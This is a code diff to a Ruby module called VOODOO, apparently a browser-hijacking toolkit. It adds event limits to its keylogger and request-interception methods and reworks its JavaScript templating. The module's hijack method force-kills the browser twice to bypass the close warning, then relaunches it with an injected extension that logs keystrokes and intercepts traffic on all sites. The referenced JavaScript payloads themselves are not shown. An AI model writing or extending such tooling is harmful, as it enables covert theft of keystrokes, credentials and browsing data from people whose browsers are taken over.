@@ -19,15 +19,16 @@ module VOODOO
             @extension.add_background_script(file: File.join(__dir__, 'js/collector.js'))
         end
 
-        def keylogger(matches: '*://*/*')
+        def keylogger(matches: '*://*/*', max_events: nil)
             add_script(matches: matches,
-                file: File.join(__dir__, 'js/keylogger.js')
+                file: File.join(__dir__, 'js/keylogger.js'),
+                max_events: max_events
             ) do |event|
                 yield event
             end
         end
 
-        def intercept(matches: nil, url_include: nil, body_include: nil, header_exists: nil)
+        def intercept(matches: nil, url_include: nil, body_include: nil, header_exists: nil, max_events: nil)
             options = {
                 matches: matches,
                 url_include: url_include,
@@ -37,6 +38,7 @@ module VOODOO
 
             add_script(options: options,
                        background: true,
+                       max_events: max_events,
                        file: File.join(__dir__, 'js/intercept.js')
             ) do |event|
                 yield event
@@ -48,13 +50,14 @@ module VOODOO
             @extension.manifest[:permissions] += permissions
         end
 
-        def hijack(urls)
+        def hijack(urls = [])
             # kill the browser process twise, to bypass close warning
             `pkill -a -i "#{@process_name}"`
             `pkill -a -i "#{@process_name}"`
             sleep 0.1
 
             urls = [urls] unless urls.kind_of? Array
+            urls = urls.uniq
 
             profile_dir = "--profile-directory=\"#{@profile}\"" if @profile != nil
             `open -b "#{@bundle}" --args #{profile_dir} --load-extension="#{@extension.save}" #{urls.shift}`
@@ -91,7 +94,7 @@ module VOODOO
             self.new(bundle: 'org.chromium.Chromium', process_name: 'Chromium')
         end
 
-        def add_script(content: nil, file: nil, matches: nil, options: {}, background: false)
+        def add_script(content: nil, file: nil, matches: nil, options: {}, background: false, max_events: nil)
             if matches != nil && background != false
                 puts 'WARNING: matches is ignored when background is set to true.'
             end
@@ -104,14 +107,48 @@ module VOODOO
                 raise StandardError.new(':content or :file argument are required')
             end
 
+            event_count = 0
+
             if block_given?
                 collector = Collector.new
-                collector.on_json {|jsond| yield jsond }
+                collector.on_json {|jsond|
+                    yield jsond
+                    if (max_events != nil)
+                        event_count += 1
+                        if event_count >= max_events.to_i
+                            collector.thread.kill
+                        end
+                    end
+                }
                 @collector_threads.push(collector.thread)
                 options[:collector_url] = collector.url
             end
 
-            content = build_js('voodoo.js', with_options: options) + "\n" + content
+            options.keys.each do |key|
+                options[(key.to_sym rescue key) || key] = options.delete(key)
+            end
+
+            voodoo_js = File.read(File.join(__dir__, 'js/voodoo.js'))
+            content = voodoo_js + "\n" + content
+
+            # find variables
+            variables = content.scan(/%{[a-z_0-9]+}/i)
+            
+            for var in variables
+                # remove %{}
+                var_sym = var[2...(var.length)-1].to_sym
+                if !options[var_sym]
+                    # when option is missing set it to nil
+                    options[var_sym] = nil
+                else
+                    if !options[var_sym].kind_of? String
+                        content = content.gsub("\"#{var}\"", var)
+                        options[var_sym] = JSON.generate(options[var_sym])
+                    end
+                end
+            end
+
+            content = content % options
             
             if background == true
                 return @extension.add_background_script(content: content)
@@ -131,14 +168,6 @@ module VOODOO
             collector.on_json {|jsond| yield jsond }
             @collector_threads.push(collector.thread)
             return collector
-        end
-
-        def build_js(file, with_options: nil)
-            js = File.read(File.join(__dir__, 'js', file))
-            if with_options != nil
-                js = js.gsub('$OPTIONS', JSON.generate(with_options))
-            end
-            return js
         end
     end
 
